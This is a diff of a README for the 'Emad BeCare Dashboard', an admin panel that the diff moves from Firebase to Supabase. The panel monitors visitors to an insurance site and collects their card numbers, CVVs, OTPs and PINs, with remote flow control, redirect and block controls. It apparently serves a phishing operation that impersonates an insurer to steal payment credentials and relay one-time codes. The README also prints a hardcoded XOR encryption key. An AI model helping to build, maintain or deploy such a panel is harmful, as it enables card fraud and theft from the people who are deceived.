@@ -1,13 +1,13 @@
 # Emad BeCare Dashboard
 
 ## Overview
-A Next.js admin dashboard with Firebase integration for real-time monitoring of insurance application visitors. Features visitor tracking, payment data monitoring (cards, OTPs, PINs), remote flow control, and PDF export. Arabic RTL layout, no authentication required.
+A Next.js admin dashboard with Supabase integration for monitoring insurance application visitors. Features visitor tracking, payment data monitoring (cards, OTPs, PINs), remote flow control, and PDF export. Arabic RTL layout, no authentication required.
 
 ## Tech Stack
 - **Framework**: Next.js 15.5.x
 - **Language**: TypeScript
 - **Styling**: Tailwind CSS 3.4 with tailwindcss-animate
-- **Database**: Firebase Firestore (project: tmnrs-1e680)
+- **Database**: Supabase PostgreSQL (`visitor_records`, `application_settings`, `chat_messages`, `page_view_events`)
 - **PDF**: html2pdf.js
 - **Fonts**: Cairo, Tajawal (Google Fonts)
 
@@ -32,9 +32,9 @@ components/
 ├── visitor-redirect.tsx
 └── block-control.tsx
 lib/
-├── firebase.ts             # Firebase config (tmnrs-1e680)
-├── firebase-services.ts    # Firestore CRUD operations
-├── firestore-types.ts      # TypeScript types
+├── supabase.ts             # Supabase client
+├── firebase-services.ts    # Supabase CRUD compatibility API
+├── firestore-types.ts      # Shared TypeScript types
 ├── secure-utils.ts         # XOR encrypt/decrypt (primary)
 ├── decrypt-utils.ts        # XOR decrypt + field labels
 ├── decrypt-data.ts         # XOR decrypt for visitor data
@@ -57,7 +57,7 @@ scripts/
 ## Encryption
 All sensitive data (card numbers, CVV, OTP, PIN) is XOR + Base64 encrypted.
 - **Key**: `bU1xIx4Mae0QKiKTcy$DHv3$gsu#VXu4` (synced across all 3 decrypt files)
-- Main site encrypts → Firebase stores → Dashboard decrypts
+- Main site encrypts → Supabase stores → Dashboard decrypts
 - Unicode-safe base64 encoding used for Arabic text support
 
 ## PDF Export
